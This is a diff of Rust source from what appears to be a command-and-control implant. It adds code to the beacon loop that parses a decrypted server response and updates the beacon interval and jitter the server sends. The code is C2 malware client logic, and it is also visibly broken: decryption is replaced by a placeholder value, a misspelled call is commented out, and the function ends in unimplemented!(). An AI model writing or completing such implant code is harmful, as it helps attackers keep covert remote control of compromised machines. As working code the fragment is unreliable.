@@ -1,6 +1,6 @@
 use core::ffi::c_void;
 
-use crate::core::net::json::JsonWriter;
+use crate::core::net::json::{JsonReader, JsonWriter};
 use crate::core::net::transport::HttpSession;
 use crate::core::net::crypto;
 use crate::debug;
@@ -348,8 +348,21 @@ pub unsafe fn beacon_loop(config: &C2Config) {
 
                 // Decrypt response
                 if let Some(plaintext) = Some(0) { //crypto::aes256_gcm_dencrypt(&key, &response_data) {
-                    todo!()
+                    // Parse Command
+                    let mut reader = JsonReader::new(&plaintext); 
+                    if let Some(response) = reader.parse_beacon_response() {
+                        // update interval/jitter if server sent new values
+                        if let Some(new_interval) = response.interval {
+                            interval = new_interval * 1000; // because server will send seconds
+                            debug!("[BEACON] Interval update: {}ms", interval);
+                        }
+                        if let Some(new_jitter) = response.jitter {
+                            jitter = new_jitter * 1000; // because server will send seconds
+                            debug!("[BEACON] Jitter update: {}ms", jitter);
+                        }
+                    }
                 }
+                unimplemented!()
             }
             None => {
                 debug!("[BEACON] POST failed, server unreachable");
